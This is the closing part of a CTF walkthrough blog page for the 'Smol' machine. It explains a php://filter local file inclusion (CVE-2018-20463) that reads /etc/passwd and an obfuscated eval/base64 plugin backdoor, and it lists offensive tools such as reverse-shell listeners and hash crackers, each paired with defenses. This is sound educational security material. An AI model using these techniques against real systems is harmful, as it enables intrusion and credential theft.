+</code></pre><hr><h2 id="concept-deep-dives">Concept Deep-Dives</h2><h3 id="cve-2018-20463--php-stream-wrapper-lfi">CVE-2018-20463 — PHP Stream Wrapper LFI</h3><p>The <code>php://filter</code> wrapper is a PHP I/O stream that can transform data before reading or writing. The <code>resource=</code> parameter specifies the file to read. When a web application passes user input directly to <code>file_get_contents()</code> or <code>include()</code> with a stream wrapper, the attacker controls what file gets read — including sensitive system files and application configs.</p><p><strong>Why <code>php://filter</code> and not just a path?</strong></p><ul><li><code>include(&#39;/etc/passwd&#39;)</code> would try to execute <code>/etc/passwd</code> as PHP, producing an error</li><li><code>php://filter/resource=/etc/passwd</code> reads it as raw text, bypassing PHP execution</li><li>The <code>convert.base64-encode</code> modifier prevents binary files from being corrupted in the HTTP response</li></ul><p><strong>Defense:</strong> Never pass user-controlled input to file access functions. Use a whitelist of allowed resources. The plugin should use <code>include</code> with hardcoded paths only.</p><h3 id="supply-chain-attack--backdoored-plugin">Supply Chain Attack — Backdoored Plugin</h3><p>This is a <strong>supply chain attack</strong> simulation. The attacker (in the CTF narrative) has modified a legitimate WordPress plugin to insert a webshell. This mirrors real-world incidents where:</p><ul><li>Developers download plugins from unofficial mirrors with malicious modifications</li><li>Plugin repositories are compromised and legitimate plugins are trojanized</li><li>Malicious code is injected during the build/publish process</li></ul><p><strong>The obfuscation layers used:</strong></p><ol><li><code>eval()</code> — executes dynamically generated code</li><li><code>base64_decode()</code> — hides the payload from string searches</li><li>Octal + hex escape sequences — obscures the <code>cmd</code> parameter name even after base64 decode</li></ol><p><strong>Detection method:</strong> Compare plugin file checksums against the official WordPress.org plugin repository. WordPress has built-in integrity checking for core files but not third-party plugins — tools like Wordfence perform this check.</p><pre><code class="language-bash"># Manual check — download official version and diff
+wget https://downloads.wordpress.org/plugin/hello-dolly.1.7.2.zip
+unzip hello-dolly.1.7.2.zip
+diff hello.php /var/www/wordpress/wp-content/plugins/hello.php
+</code></pre><h3 id="internal-group--home-directory-misconfiguration">Internal Group — Home Directory Misconfiguration</h3><p>The custom <code>internal</code> group grants read access to all members’ home directories. This is intended for collaboration but fatally enables:</p><ul><li>Reading SSH private keys</li><li>Reading bash history files (if not symlinked to <code>/dev/null</code>)</li><li>Reading credential files left in home directories</li></ul><p><strong>Defense:</strong> Home directories should be <code>chmod 700</code> (owner only). SSH private keys must be <code>chmod 600</code>. Avoid custom groups with broad file access unless strictly necessary.</p><h3 id="old-archives-containing-credentials">Old Archives Containing Credentials</h3><p><code>wordpress.old.zip</code> is a backup of the previous WordPress installation, left in a user’s home directory. Backup files are gold mines for attackers because:</p><ul><li>They often contain plaintext or weakly-hashed credentials</li><li>Developers/admins forget they exist</li><li>Old passwords are often reused on current accounts</li></ul><p><strong>Defense:</strong> Never store backups in home directories. Encrypt all backups. Purge old backups after rotation. Audit for <code>.zip</code>, <code>.tar.gz</code>, <code>.bak</code>, <code>.old</code> files in user-accessible directories regularly.</p><hr><h2 id="key-takeaways">Key Takeaways</h2><p><strong>1. WordPress Plugin Updates Are Security-Critical</strong><br>The jsmol2wp plugin hadn’t been updated since 2018. A 7-year-old LFI vulnerability was the entire entry point. Treat plugin updates as security patches, not optional improvements.</p><p><strong>2. Audit Third-Party Plugin Source Code</strong><br>The Hello Dolly backdoor would be caught immediately by diffing the installed file against the official version. This should be standard practice for all plugins, especially ones installed from unofficial sources.</p><p><strong>3. Never Reuse Database Passwords as OS Passwords</strong><br><code>wp-config.php</code> credentials should be DB-only. They should never match any OS user account’s password.</p><p><strong>4. SSH Keys in World-Readable Directories Are Stolen Keys</strong><br>If the <code>internal</code> group can read <code>~/.ssh/id_rsa</code>, every group member owns that identity. Apply <code>chmod 700 ~/.ssh</code> and <code>chmod 600 ~/.ssh/id_rsa</code>.</p><p><strong>5. Old Backup Files Are Active Vulnerabilities</strong><br><code>wordpress.old.zip</code> enabled two more privilege escalation steps. Any file containing credentials — even “old” ones — is an attack asset if it’s accessible.</p><p><strong>6. <code>sudo (ALL:ALL) ALL</code> Is Root</strong><br>Any user with this sudo rule is effectively root. Audit sudoers rigorously and apply least-privilege — most users should have no sudo rights at all.</p><hr><h2 id="tools-reference">Tools Reference</h2><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><code>nmap -sCV</code></td><td>Port scan with service detection</td></tr><tr><td><code>wpscan</code></td><td>WordPress plugin/user/theme enumeration</td></tr><tr><td><code>dirsearch</code> / <code>feroxbuster</code></td><td>Directory and file bruteforcing</td></tr><tr><td><code>curl</code> / browser</td><td>Manual LFI exploitation</td></tr><tr><td><code>nc -lvnp</code></td><td>Reverse shell listener</td></tr><tr><td><code>rlwrap nc</code></td><td>Reverse shell with readline support</td></tr><tr><td><code>python3 -c &#39;import pty...&#39;</code></td><td>Shell stabilization</td></tr><tr><td><code>mysql</code></td><td>Local database access</td></tr><tr><td><code>john</code></td><td>Hash cracking (PHPass WordPress format)</td></tr><tr><td><code>hashcat -m 400</code></td><td>GPU-accelerated PHPass cracking</td></tr><tr><td><code>ssh -i</code></td><td>SSH with private key</td></tr><tr><td><code>python3 -m http.server</code></td><td>File transfer via HTTP</td></tr><tr><td><code>sudo -l</code></td><td>Enumerate sudo privileges</td></tr></tbody></table><hr></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/">CTF Writeups</a></li><li><a href="https://h4ck3rfirst.github.io/tags/cve-2018-20463/">cve-2018-20463</a></li><li><a href="https://h4ck3rfirst.github.io/tags/lfi/">LFI</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/nmap/">Nmap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/plugin/">plugin</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ssrf/">ssrf</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sudo/">sudo</a></li><li><a href="https://h4ck3rfirst.github.io/tags/think/">think</a></li><li><a href="https://h4ck3rfirst.github.io/tags/tryhackme/">TryHackMe</a></li><li><a href="https://h4ck3rfirst.github.io/tags/wordpress/">wordpress</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-smol-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Smol%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-smol-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Smol%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-smol-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-prev"><a href="https://h4ck3rfirst.github.io/hackthebox-planning-walkthrough/" class="content__nav-link" rel="prev"><div><span>Previous</span> HackTheBox Planning Walkthrough</div></a></div><div class="content__nav-next"><a href="https://h4ck3rfirst.github.io/overthewire-natas-level-1-20/" class="content__nav-link" rel="next"><div><span>Next</span> overthewire-natas-level 1-20</div></a></div></div></div></nav></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-06-14T18:39" class="feed__date">June 14, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-mr-robot-walkthrough/">Tryhackme Mr robot Walkthrough</a></h3></header><p>Welcome to the walkthrough of the Robot room on TryHackMe, inspired by the Mr. Robot TV series. This lab focuses&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
+            "s ease-in-out " +
+            twinkleDelay +
+            "s infinite";
+
+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
